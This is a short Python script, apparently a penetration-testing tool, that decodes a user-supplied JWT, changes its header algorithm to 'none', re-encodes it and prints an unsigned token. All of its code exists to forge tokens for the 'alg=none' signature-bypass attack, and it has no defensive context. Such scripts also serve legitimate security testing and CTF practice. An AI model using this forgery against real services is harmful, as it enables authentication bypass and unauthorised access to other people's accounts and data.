import base64
import json


token = input("Enter your JWT: ").strip()


def decode_base64url(data):
    """Base64 decoding function(including padding)."""
    padding = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

# Decoding the token.
header_b64, payload_b64, signature = token.split('.')
# Decoding header и payload.
header = json.loads(decode_base64url(header_b64))
payload = json.loads(decode_base64url(payload_b64))

print("Header before modification:", header)
print("Payload before modification:", payload)
# Replacing the algorithm with "none" in header.
header['alg'] = 'none'
# Encoding header and payload back to base64.
header_b64_new = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64_new = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
# Creating a new token without signature(alg = none).
new_token = f"{header_b64_new}.{payload_b64_new}."

print("New token with alg=none:", new_token)